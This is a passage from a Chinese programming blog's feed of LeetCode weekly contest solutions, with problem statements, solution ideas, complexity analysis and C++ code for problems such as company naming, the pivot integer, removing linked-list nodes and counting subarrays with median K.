class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &amp; (<span class="number">1</span>&lt;&lt;j)) &#123;</span><br><span class="line">                    sum[i] += cookies[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; (<span class="number">1</span> &lt;&lt; n); j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dp[i<span class="number">-1</span>][j] != INT_MAX) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt; (<span class="number">1</span> &lt;&lt; n); k = (k + <span class="number">1</span>) | j) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((j | k) == k) &#123;</span><br><span class="line">                            dp[i][k] = <span class="built_in">min</span>(dp[i][k], <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], sum[k ^ j]));</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[k][(<span class="number">1</span>&lt;&lt;n) - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>正向 <code>dp</code>:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">distributeCookies</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; cookies, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = cookies.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(k + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">1</span>&lt;&lt;n, INT_MAX));</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">sum</span><span class="params">(<span class="number">1</span>&lt;&lt;n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span>&lt;&lt;n); i++) &#123;</span><br><span class="line">            <span class="type">int</span> curr = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &amp; (<span class="number">1</span>&lt;&lt;j)) &#123;</span><br><span class="line">                    curr += cookies[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sum[i] = curr;</span><br><span class="line">            dp[<span class="number">1</span>][i] = curr;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= k; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt; (<span class="number">1</span>&lt;&lt;n); j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> s = j; s != <span class="number">0</span>; s = (s - <span class="number">1</span>) &amp; j) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (dp[i<span class="number">-1</span>][s] != INT_MAX) &#123;</span><br><span class="line">                        dp[i][j] = <span class="built_in">min</span>(dp[i][j], <span class="built_in">max</span>(dp[i<span class="number">-1</span>][s], sum[j^s]));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[k][(<span class="number">1</span>&lt;&lt;n) - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6094-公司命名"><a href="#6094-公司命名" class="headerlink" title="6094. 公司命名"></a>6094. 公司命名</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个字符串数组 <code>ideas</code> 表示在公司命名过程中使用的名字列表。公司命名流程如下：</p>
<ul>
<li>从 <code>ideas</code> 中选择 <code>2</code> 个 不同 名字，称为 <code>ideaA </code>和 <code>ideaB </code>。</li>
<li>交换 <code>ideaA</code> 和 <code>ideaB</code> 的首字母。</li>
<li>如果得到的两个新名字 都 不在 <code>ideas</code> 中，那么 <code>ideaA</code> <code>ideaB</code>（串联 ideaA 和 ideaB ，中间用一个空格分隔）是一个有效的公司名字。<br>否则，不是一个有效的名字。<br>返回 不同 且有效的公司名字的数目。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：ideas = [&quot;coffee&quot;,&quot;donuts&quot;,&quot;time&quot;,&quot;toffee&quot;]</span><br><span class="line">输出：6</span><br><span class="line">解释：下面列出一些有效的选择方案：</span><br><span class="line">- (&quot;coffee&quot;, &quot;donuts&quot;)：对应的公司名字是 &quot;doffee conuts&quot; 。</span><br><span class="line">- (&quot;donuts&quot;, &quot;coffee&quot;)：对应的公司名字是 &quot;conuts doffee&quot; 。</span><br><span class="line">- (&quot;donuts&quot;, &quot;time&quot;)：对应的公司名字是 &quot;tonuts dime&quot; 。</span><br><span class="line">- (&quot;donuts&quot;, &quot;toffee&quot;)：对应的公司名字是 &quot;tonuts doffee&quot; 。</span><br><span class="line">- (&quot;time&quot;, &quot;donuts&quot;)：对应的公司名字是 &quot;dime tonuts&quot; 。</span><br><span class="line">- (&quot;toffee&quot;, &quot;donuts&quot;)：对应的公司名字是 &quot;doffee tonuts&quot; 。</span><br><span class="line">因此，总共有 6 个不同的公司名字。</span><br><span class="line"></span><br><span class="line">下面列出一些无效的选择方案：</span><br><span class="line">- (&quot;coffee&quot;, &quot;time&quot;)：在原数组中存在交换后形成的名字 &quot;toffee&quot; 。</span><br><span class="line">- (&quot;time&quot;, &quot;toffee&quot;)：在原数组中存在交换后形成的两个名字。</span><br><span class="line">- (&quot;coffee&quot;, &quot;toffee&quot;)：在原数组中存在交换后形成的两个名字。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：ideas = [&quot;lack&quot;,&quot;back&quot;]</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在有效的选择方案。因此，返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>2 &lt;= ideas.length &lt;= 5 * 104</code></li>
<li><code>1 &lt;= ideas[i].length &lt;= 10</code></li>
<li><code>ideas[i]</code> 由小写英文字母组成</li>
<li><code>ideas</code> 中的所有字符串 互不相同</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/naming-a-company">https://leetcode.cn/problems/naming-a-company</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>字符串
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目很奇怪，不知道想考察什么内容，感觉纯粹的就是考察观察力，不需要什么算法技巧即可。</li>
</ol>
<ul>
<li>首先我们用$hash$ 表保存所有的字符串，这个主要是为了查找变换后是否出现在字符串数组中很方便。</li>
<li>首先我们统计出第 $i$ 个字符串是否可以替换首为字母为 $j$ 的字符串，$\textit{canswap}[i][j]$ 表示第 $i$ 个字符串的首字母可以替换为 $\texttt{&#96;a’} + j$。</li>
<li>同时统计字符串中可以由首字母 <code>i</code> 替换为首字符 <code>j</code> 的数目，$\textit{conv}[i][j]$ 表示字符串中为 $i$ 且可以变换为首字母为 $j$ 的字符串的个数。</li>
<li>我们遍历每一个字符串是 $s[i]$ 时，设此时 $s[i]$ 的首字母为 $k$， 如果 $s[i]$ 需要将首字母 $k$ 替换为 $j$ 时，此时则与之对应的字符串则需要将首字母 $j$ 替换为 $k$，只有这样才能达到互换，且保证互换后的两个字符串都不在原始数组 $\textit{ideas}$ 中，因此我们可以知道此时可以行程的公司名字数目为 $conv[j][k]$, 我们依次枚举所有可能的互换即可得到最终的结果。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$|\Sigma| \times n $，其中 $n$ 表示字符串的长度。</li>
<li>空间复杂度：$|\Sigma| \times n $, 其中 $n$ 表示字符串的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">distinctNames</span><span class="params">(vector&lt;string&gt;&amp; ideas)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = ideas.<span class="built_in">size</span>();</span><br><span class="line">        unordered_set&lt;string&gt; cnt;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">canswap</span>(n, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">conv</span>(<span class="number">26</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>));</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp; w : ideas) &#123;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(w);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            string curr = ideas[i];</span><br><span class="line">            <span class="type">int</span> x = ideas[i][<span class="number">0</span>] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (k != ideas[i][<span class="number">0</span>] - <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">                    curr[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span> + k;</span><br><span class="line">                    <span class="keyword">if</span> (!cnt.<span class="built_in">count</span>(curr)) &#123;</span><br><span class="line">                        canswap[i][k] = <span class="number">1</span>;</span><br><span class="line">                        conv[x][k]++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> k = ideas[i][<span class="number">0</span>] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(canswap[i][j]) &#123;</span><br><span class="line">                    res += conv[j][k];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest 321</title>
    <url>/2022/11/27/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/83/</url>
    <content><![CDATA[<h2 id="leetcode-contest-321"><a href="#leetcode-contest-321" class="headerlink" title="leetcode  contest 321"></a>leetcode  contest 321</h2><p>前三题确实是太简单了，最后一题稍微有点难度。</p>
<h3 id="6245-找出中枢整数"><a href="#6245-找出中枢整数" class="headerlink" title="6245. 找出中枢整数"></a>6245. 找出中枢整数</h3><p>给你一个正整数 <code>n</code> ，找出满足下述条件的 <strong>中枢整数</strong> <code>x</code> ：</p>
<ul>
<li><code>1</code> 和 <code>x</code> 之间的所有元素之和等于 <code>x</code> 和 <code>n</code> 之间所有元素之和。</li>
</ul>
<p>返回中枢整数 <code>x</code> 。如果不存在中枢整数，则返回 <code>-1</code> 。题目保证对于给定的输入，至多存在一个中枢整数。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 8</span><br><span class="line">输出：6</span><br><span class="line">解释：6 是中枢整数，因为 1 + 2 + 3 + 4 + 5 + 6 = 6 + 7 + 8 = 21 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 1</span><br><span class="line">输出：1</span><br><span class="line">解释：1 是中枢整数，因为 1 = 1 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4</span><br><span class="line">输出：-1</span><br><span class="line">解释：可以证明不存在满足题目要求的整数。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 1000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-321/problems/find-the-pivot-integer/">https://leetcode.cn/contest/weekly-contest-321/problems/find-the-pivot-integer/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历即可
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接遍历求出前 $i$ 项和与后 $n - i + 1$ 项的和，利用等差数列求和公式即可。 </li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">pivotInteger</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> left = i * (i + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="type">int</span> right = (n - i + <span class="number">1</span>) * (i + n) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (left == right) &#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6246-追加字符以获得子序列"><a href="#6246-追加字符以获得子序列" class="headerlink" title="6246. 追加字符以获得子序列"></a>6246. 追加字符以获得子序列</h3><p>给你两个仅由小写英文字母组成的字符串 <code>s</code> 和 <code>t</code> 。</p>
<p>现在需要通过向 <code>s</code> 末尾追加字符的方式使 <code>t</code> 变成 <code>s</code> 的一个 <strong>子序列</strong> ，返回需要追加的最少字符数。</p>
<p>子序列是一个可以由其他字符串删除部分（或不删除）字符但不改变剩下字符顺序得到的字符串。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;coaching&quot;, t = &quot;coding&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：向 s 末尾追加字符串 &quot;ding&quot; ，s = &quot;coachingding&quot; 。</span><br><span class="line">现在，t 是 s (&quot;coachingding&quot;) 的一个子序列。</span><br><span class="line">可以证明向 s 末尾追加任何 3 个字符都无法使 t 成为 s 的一个子序列。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abcde&quot;, t = &quot;a&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：t 已经是 s (&quot;abcde&quot;) 的一个子序列。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;z&quot;, t = &quot;abcde&quot;</span><br><span class="line">输出：5</span><br><span class="line">解释：向 s 末尾追加字符串 &quot;abcde&quot; ，s = &quot;zabcde&quot; 。</span><br><span class="line">现在，t 是 s (&quot;zabcde&quot;) 的一个子序列。 </span><br><span class="line">可以证明向 s 末尾追加任何 4 个字符都无法使 t 成为 s 的一个子序列。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length, t.length &lt;= 105</code></li>
<li><code>s</code> 和 <code>t</code> 仅由小写英文字母组成</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-321/problems/append-characters-to-string-to-make-subsequence/">https://leetcode.cn/contest/weekly-contest-321/problems/append-characters-to-string-to-make-subsequence/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>双指针
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的双指针，$i$ 指向 $s$，$j$ 指向 $t$，如果满足 $s[i] &#x3D; t[j]$，此时向右移动 $j$，最终返回 $|t| - j$ 即可。即找到此时 $s$ 中为 $t$ 的子序列的最多数目。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(m + n)$，其中 $m,n$ 表示两个字符串的长度。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">appendCharacters</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; s.<span class="built_in">size</span>() &amp;&amp; j &lt; t.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == t[j]) &#123;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> t.<span class="built_in">size</span>() - j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="6247-从链表中移除节点"><a href="#6247-从链表中移除节点" class="headerlink" title="6247. 从链表中移除节点"></a>6247. 从链表中移除节点</h3><p>给你一个链表的头节点 <code>head</code> 。</p>
<p>对于列表中的每个节点 <code>node</code> ，如果其右侧存在一个具有 <strong>严格更大</strong> 值的节点，则移除 <code>node</code> 。</p>
<p>返回修改后链表的头节点 <code>head</code> 。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/02/drawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [5,2,13,3,8]</span><br><span class="line">输出：[13,8]</span><br><span class="line">解释：需要移除的节点是 5 ，2 和 3 。</span><br><span class="line">- 节点 13 在节点 5 右侧。</span><br><span class="line">- 节点 13 在节点 2 右侧。</span><br><span class="line">- 节点 8 在节点 3 右侧。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：head = [1,1,1,1]</span><br><span class="line">输出：[1,1,1,1]</span><br><span class="line">解释：每个节点的值都是 1 ，所以没有需要移除的节点。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li>给定列表中的节点数目在范围 <code>[1, 105]</code> 内</li>
<li><code>1 &lt;= Node.val &lt;= 105</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-321/problems/remove-nodes-from-linked-list/">https://leetcode.cn/contest/weekly-contest-321/problems/remove-nodes-from-linked-list/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>单调栈
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>不知道这个题目有啥意思，简单的一个单调栈就全部搞定。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为给定的节点的数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为给定的节点的数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNodes</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">        <span class="keyword">while</span>(head) &#123;</span><br><span class="line">            <span class="keyword">while</span> (st.<span class="built_in">size</span>() &gt; <span class="number">0</span> &amp;&amp; head-&gt;val &gt; st.<span class="built_in">back</span>()) &#123;</span><br><span class="line">                st.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">emplace_back</span>(head-&gt;val);</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *res = <span class="keyword">new</span> <span class="built_in">ListNode</span>(st[<span class="number">0</span>]);</span><br><span class="line">        ListNode *curr = res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; st.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            curr-&gt;next = <span class="keyword">new</span> <span class="built_in">ListNode</span>(st[i]);</span><br><span class="line">            curr= curr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>递归<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNodes</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!head) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode *node = <span class="built_in">removeNodes</span>(head-&gt;next);</span><br><span class="line">        <span class="keyword">if</span> (node &amp;&amp; node-&gt;val &gt; head-&gt;val) &#123;</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            head-&gt;next = node;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="6248-统计中位数为-K-的子数组"><a href="#6248-统计中位数为-K-的子数组" class="headerlink" title="6248. 统计中位数为 K 的子数组"></a>6248. 统计中位数为 K 的子数组</h3><p>给你一个长度为 <code>n</code> 的数组 <code>nums</code> ，该数组由从 <code>1</code> 到 <code>n</code> 的 <strong>不同</strong> 整数组成。另给你一个正整数 <code>k</code> 。</p>
<p>统计并返回 <code>num</code> 中的 <strong>中位数</strong> 等于 <code>k</code> 的非空子数组的数目。</p>
<p><strong>注意：</strong></p>
<ul>
<li><p>数组的中位数是按</p>
<p>递增</p>
<p>顺序排列后位于</p>
<p>中间</p>
<p>的那个元素，如果数组长度为偶数，则中位数是位于中间靠</p>
<p>左</p>
<p>的那个元素。</p>
<ul>
<li>例如，<code>[2,3,1,4]</code> 的中位数是 <code>2</code> ，<code>[8,4,3,5,1]</code> 的中位数是 <code>4</code> 。</li>
</ul>
</li>
<li><p>子数组是数组中的一个连续部分。</p>
</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,2,1,4,5], k = 4</span><br><span class="line">输出：3</span><br><span class="line">解释：中位数等于 4 的子数组有：[4]、[4,5] 和 [1,4,5] 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,3,1], k = 3</span><br><span class="line">输出：1</span><br><span class="line">解释：[3] 是唯一一个中位数等于 3 的子数组。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= nums[i], k &lt;= n</code></li>
<li><code>nums</code> 中的整数互不相同</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-321/problems/count-subarrays-with-median-k/">https://leetcode.cn/contest/weekly-contest-321/problems/count-subarrays-with-median-k/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 滑动窗口</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>设 $i$ 指向连续子数组的左侧， $j$ 指向符合题目要求的连续子数组的右侧，则此时子数目的数目为 $j - i + 1$，子数组 $nums[i,\cdots,j]$ 中大于 $k$ 的数目为 $x$，小于 $k$ 的数目为 $y$，则分类讨论如下:</li>
</ol>
<ul>
<li>此时一定满足 $j - i + 1 &#x3D; x + y + 1$；</li>
<li>如果满足 $k$ 为中位数，则此时一定满足:<ul>
<li>如果 $j - i + 1$ 为偶数，则此时一定满足 $y - x &#x3D; 1$ 才能使得连续子数组 $nums[i,\cdots,j]$ 的中位数为 $k$, 此时 $y - x &#x3D; 1$；</li>
<li>如果 $j - i + 1$ 为奇数数，则此时一定满足 $x &#x3D; y$，才能使得连续子数组 $nums[i,\cdots,j]$ 的中位数为 $k$, 此时 $y - x &#x3D; 0$；</li>
</ul>
</li>
</ul>
<ol start="2">
<li>我们依次记录所有 $i &lt; index(k)$ 处当前大于 $k$ 的数目与小于 $k$ 的数目之差为 $diff$ 的索引个数 $cnt[diff]$。根据上述推论可以知道，加入我们当前遍历到索引 $j, j \ge index(k)$ 处，则，此时大于 $k$ 的数字个数为 $g[i]$，小于 $k$ 的数字个数为 $l[i]$，此时二者之差为 $diff &#x3D; g[i] - l[i]$，</li>
</ol>
<ul>
<li>假设我们当前的使得大于 $k$ 的数目与小于 $k$ 的数目相等，此时我们只需在 $i &lt; k$ 处找到符合条件的索引的 $i$ 的个数即可，此时我们只需要查询 $cnt[g[i] - l[i]]$ 即可。</li>
<li>假设我们当前的使得大于 $k$ 的数目与小于 $k$ 的数目之差为 $1$，此时我们只需在 $i &lt; k$ 处找到符合条件的索引的 $i$ 的个数即可，此时我们只需要查询 $cnt[g[i] - l[i] - 1]$ 即可。</li>
<li>以 $i$ 为结尾的连续子数组中符合满足要求的子数组的个数即为 $cnt[g[i] - l[i]] + cnt[g[i] - l[i] - 1]$。</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示给定的数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示给定的数组的长度。</li>
</ul>
